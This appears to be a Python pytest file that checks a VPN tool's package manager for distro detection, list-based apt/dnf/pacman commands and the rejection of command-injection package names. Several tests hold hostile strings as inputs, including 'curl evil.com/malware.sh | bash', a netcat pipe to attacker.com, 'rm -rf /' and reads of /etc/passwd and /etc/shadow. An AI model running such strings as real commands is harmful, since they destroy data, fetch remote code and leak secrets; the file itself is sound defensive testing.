"""Comprehensive tests for package management security.

This test suite validates the security fixes in the system/packages.py module,
particularly the prevention of command injection through package names.
"""

import pytest
from vpnhd.system.packages import PackageManager
from vpnhd.exceptions import ValidationError


class TestPackageManagerInitialization:
    """Test PackageManager initialization."""

    def test_initialization(self, mocker):
        """Test PackageManager initializes correctly."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=debian\nVERSION_ID="13"'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')
        mock_check.return_value = True

        pm = PackageManager()

        assert pm.distro == "debian"
        assert pm.package_manager in ["apt", "apt-get", "dnf", "yum", "pacman"]

    def test_detect_debian_distro(self, mocker):
        """Test detecting Debian distribution."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=debian\nVERSION_ID="13"'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')
        mock_check.return_value = True

        pm = PackageManager()

        assert pm.distro == "debian"

    def test_detect_ubuntu_distro(self, mocker):
        """Test detecting Ubuntu distribution."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=ubuntu\nVERSION_ID="22.04"'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')
        mock_check.return_value = True

        pm = PackageManager()

        assert pm.distro == "ubuntu"

    def test_detect_fedora_distro(self, mocker):
        """Test detecting Fedora distribution."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=fedora\nVERSION_ID="38"'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')
        mock_check.return_value = True

        pm = PackageManager()

        assert pm.distro == "fedora"

    def test_detect_package_manager_apt(self, mocker):
        """Test detecting apt package manager."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=debian'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')

        def check_side_effect(cmd):
            return cmd == "apt"

        mock_check.side_effect = check_side_effect

        pm = PackageManager()

        assert pm.package_manager == "apt"

    def test_detect_package_manager_dnf(self, mocker):
        """Test detecting dnf package manager."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(
            read_data='ID=fedora'
        ))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')

        def check_side_effect(cmd):
            return cmd == "dnf"

        mock_check.side_effect = check_side_effect

        pm = PackageManager()

        assert pm.package_manager == "dnf"


class TestIsPackageInstalled:
    """Test is_package_installed method (CRITICAL for security)."""

    def test_valid_package_name_accepted(self, mocker, valid_package_names):
        """Test that valid package names are accepted."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        for package in valid_package_names[:5]:  # Test a few
            result = pm.is_package_installed(package)
            # Should not raise ValidationError

    def test_invalid_package_name_rejected(self, mocker, invalid_package_names):
        """Test that invalid package names are rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        for package in invalid_package_names[:5]:  # Test a few
            with pytest.raises(ValidationError) as exc_info:
                pm.is_package_installed(package)

            assert "package" in str(exc_info.value).lower()

    def test_injection_attempt_rejected(self, mocker):
        """Test that command injection attempts are rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        dangerous_packages = [
            "vim; rm -rf /",
            "vim && cat /etc/passwd",
            "vim|nc evil.com 1234",
            "vim`whoami`",
            "vim$(id)",
        ]

        for dangerous in dangerous_packages:
            with pytest.raises(ValidationError):
                pm.is_package_installed(dangerous)

    def test_debian_package_check_uses_dpkg(self, mocker):
        """Test that Debian systems use dpkg for checking."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"  # Force apt

        result = pm.is_package_installed("vim")

        # Verify dpkg was used
        call_args = mock_cmd.call_args
        assert call_args[0][0] == ["dpkg", "-l", "vim"]

    def test_fedora_package_check_uses_rpm(self, mocker):
        """Test that Fedora systems use rpm for checking."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=fedora'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "dnf"  # Force dnf

        result = pm.is_package_installed("vim")

        # Verify rpm was used
        call_args = mock_cmd.call_args
        assert call_args[0][0] == ["rpm", "-q", "vim"]

    def test_package_installed_true(self, mocker):
        """Test detecting installed package."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        result = pm.is_package_installed("vim")

        assert result is True

    def test_package_not_installed_false(self, mocker):
        """Test detecting non-installed package."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=False, exit_code=1, stdout="", stderr="")

        pm = PackageManager()

        result = pm.is_package_installed("nonexistent-package")

        assert result is False


class TestInstallPackage:
    """Test install_package method (CRITICAL for security)."""

    def test_valid_package_installation(self, mocker):
        """Test installing valid package."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        result = pm.install_package("vim")

        assert result is True

    def test_invalid_package_name_rejected(self, mocker):
        """Test that invalid package names are rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        with pytest.raises(ValidationError):
            pm.install_package("vim; rm -rf /")

    def test_injection_attempts_blocked(self, mocker):
        """Test that injection attempts are blocked."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        dangerous_packages = [
            "vim && curl evil.com/malware.sh | bash",
            "vim; reboot",
            "vim|nc attacker.com 1234",
            "`whoami`",
            "$(uname -a)",
        ]

        for dangerous in dangerous_packages:
            with pytest.raises(ValidationError):
                pm.install_package(dangerous)

    def test_debian_install_uses_apt(self, mocker):
        """Test that Debian uses apt for installation."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"

        pm.install_package("vim", assume_yes=True)

        # Verify apt install was used with array format
        call_args = mock_cmd.call_args_list[-1]  # Last call (install, not check)
        assert call_args[0][0] == ["apt", "install", "-y", "vim"]

    def test_fedora_install_uses_dnf(self, mocker):
        """Test that Fedora uses dnf for installation."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=fedora'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "dnf"

        pm.install_package("vim", assume_yes=True)

        # Verify dnf install was used
        call_args = mock_cmd.call_args_list[-1]
        assert call_args[0][0] == ["dnf", "install", "-y", "vim"]

    def test_install_without_assume_yes(self, mocker):
        """Test installation without -y flag."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"

        pm.install_package("vim", assume_yes=False)

        # Verify -y flag is NOT present
        call_args = mock_cmd.call_args_list[-1]
        assert "-y" not in call_args[0][0]

    def test_install_already_installed_package(self, mocker):
        """Test installing already installed package."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        # Mock is_package_installed to return True
        mocker.patch.object(pm, 'is_package_installed', return_value=True)

        result = pm.install_package("vim")

        # Should return True without actually installing
        assert result is True

    def test_install_uses_array_commands(self, mocker):
        """Test that install uses array-based commands (secure)."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        pm.install_package("wireguard-tools")

        # Verify all commands use array format
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list), f"Should use array format, got: {type(command)}"


class TestInstallPackages:
    """Test install_packages method (batch installation)."""

    def test_install_multiple_packages_success(self, mocker):
        """Test installing multiple packages successfully."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        packages = ["vim", "git", "curl"]
        successful, failed = pm.install_packages(packages)

        assert len(successful) == 3
        assert len(failed) == 0

    def test_install_with_one_failure(self, mocker):
        """Test batch install with one failure."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')

        # First package succeeds, second fails, third succeeds
        mock_cmd.side_effect = [
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # Check 1: not installed
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),   # Install 1: success
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # Check 2: not installed
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # Install 2: failure
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # Check 3: not installed
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),   # Install 3: success
        ]

        pm = PackageManager()

        packages = ["vim", "nonexistent", "git"]
        successful, failed = pm.install_packages(packages)

        assert len(successful) == 2
        assert len(failed) == 1
        assert "nonexistent" in failed

    def test_install_packages_validates_all_first(self, mocker):
        """Test that all packages are validated before any installation."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        # Include one invalid package
        packages = ["vim", "git; rm -rf /", "curl"]

        with pytest.raises(ValidationError):
            pm.install_packages(packages)

        # Should fail before any installation


class TestUpdatePackageCache:
    """Test update_package_cache method."""

    def test_debian_update_uses_apt_update(self, mocker):
        """Test that Debian uses apt update."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"

        result = pm.update_package_cache()

        assert result is True
        call_args = mock_cmd.call_args
        assert call_args[0][0] == ["apt", "update"]

    def test_fedora_update_uses_dnf_check_update(self, mocker):
        """Test that Fedora uses dnf check-update."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=fedora'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "dnf"

        result = pm.update_package_cache()

        call_args = mock_cmd.call_args
        assert call_args[0][0] == ["dnf", "check-update"]

    def test_dnf_check_update_exit_code_100_is_success(self, mocker):
        """Test that dnf check-update exit code 100 is treated as success."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=fedora'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        # Exit code 100 means updates available
        mock_cmd.return_value = mocker.Mock(success=False, exit_code=100, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "dnf"

        result = pm.update_package_cache()

        # Exit code 100 should be treated as success
        assert result is True


class TestRemovePackage:
    """Test remove_package method."""

    def test_valid_package_removal(self, mocker):
        """Test removing valid package."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        result = pm.remove_package("vim")

        assert result is True

    def test_invalid_package_name_rejected(self, mocker):
        """Test that invalid package names are rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        with pytest.raises(ValidationError):
            pm.remove_package("vim; rm -rf /")

    def test_debian_remove_uses_apt_remove(self, mocker):
        """Test that Debian uses apt remove."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"

        pm.remove_package("vim", assume_yes=True)

        call_args = mock_cmd.call_args
        assert call_args[0][0] == ["apt", "remove", "-y", "vim"]

    def test_remove_uses_array_commands(self, mocker):
        """Test that remove uses array-based commands."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        pm.remove_package("vim")

        call_args = mock_cmd.call_args
        assert isinstance(call_args[0][0], list)


class TestGetRequiredPackages:
    """Test get_required_packages method."""

    def test_debian_required_packages(self, mocker):
        """Test getting Debian required packages."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        packages = pm.get_required_packages()

        assert isinstance(packages, list)
        assert len(packages) > 0
        # Should include wireguard-tools, python3, etc.

    def test_fedora_required_packages(self, mocker):
        """Test getting Fedora required packages."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=fedora'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        packages = pm.get_required_packages()

        assert isinstance(packages, list)
        assert len(packages) > 0

    def test_unknown_distro_defaults_to_debian(self, mocker):
        """Test that unknown distro defaults to Debian packages."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=unknown'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        packages = pm.get_required_packages()

        # Should default to Debian packages
        assert isinstance(packages, list)


class TestCommandInjectionPrevention:
    """Comprehensive injection prevention tests for PackageManager."""

    @pytest.mark.parametrize("malicious_package", [
        "vim; rm -rf /",
        "vim && curl evil.com/malware.sh | bash",
        "vim|nc attacker.com 1234",
        "`whoami`",
        "$(id)",
        "../../../etc/shadow",
        "'; DROP TABLE packages; --",
        "vim\n/bin/bash",
    ])
    def test_all_methods_reject_malicious_packages(self, mocker, malicious_package):
        """Test that all methods reject malicious package names."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        # Test is_package_installed
        with pytest.raises(ValidationError):
            pm.is_package_installed(malicious_package)

        # Test install_package
        with pytest.raises(ValidationError):
            pm.install_package(malicious_package)

        # Test remove_package
        with pytest.raises(ValidationError):
            pm.remove_package(malicious_package)

    def test_no_f_strings_in_package_commands(self, mocker):
        """Test that no f-strings are used in package commands."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "apt"

        # Execute various methods
        pm.is_package_installed("vim")
        pm.install_package("git")
        pm.remove_package("curl")
        pm.update_package_cache()

        # Verify all calls use list format
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list), f"Command should be list, got: {type(command)}"

    def test_batch_install_rejects_any_malicious(self, mocker):
        """Test that batch install rejects if ANY package is malicious."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        # Mix of valid and malicious packages
        packages = ["vim", "git", "curl && malware", "python3"]

        with pytest.raises(ValidationError):
            pm.install_packages(packages)


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_package_name_rejected(self, mocker):
        """Test that empty package name is rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        with pytest.raises(ValidationError):
            pm.install_package("")

    def test_package_name_max_length(self, mocker):
        """Test package name at maximum length (256 characters)."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        # Exactly 256 characters
        long_name = "a" * 256
        result = pm.is_package_installed(long_name)
        # Should not raise ValidationError

    def test_package_name_over_max_length_rejected(self, mocker):
        """Test package name over maximum length is rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        # 257 characters
        too_long = "a" * 257

        with pytest.raises(ValidationError):
            pm.install_package(too_long)

    def test_package_with_special_characters(self, mocker):
        """Test valid packages with special characters."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        # Valid special characters
        valid_packages = [
            "python3-pip",  # Hyphen
            "python3.11",   # Period
            "lib_name",     # Underscore
            "g++",          # Plus
        ]

        for package in valid_packages:
            result = pm.install_package(package)
            assert result is True

    def test_unicode_in_package_name_rejected(self, mocker):
        """Test that unicode characters are rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        with pytest.raises(ValidationError):
            pm.install_package("vim🔥")

    def test_whitespace_in_package_name_rejected(self, mocker):
        """Test that whitespace is rejected."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=debian'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists', return_value=True)

        pm = PackageManager()

        with pytest.raises(ValidationError):
            pm.install_package("vim package")

    def test_pacman_package_manager_support(self, mocker):
        """Test pacman package manager support."""
        mock_open = mocker.patch('builtins.open', mocker.mock_open(read_data='ID=arch'))
        mock_check = mocker.patch('vpnhd.system.packages.check_command_exists')

        def check_side_effect(cmd):
            return cmd == "pacman"

        mock_check.side_effect = check_side_effect
        mock_cmd = mocker.patch('vpnhd.system.packages.execute_command')
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.package_manager = "pacman"

        pm.install_package("vim", assume_yes=True)

        # Verify pacman install command
        call_args = mock_cmd.call_args_list[-1]
        assert call_args[0][0] == ["pacman", "-S", "--noconfirm", "vim"]
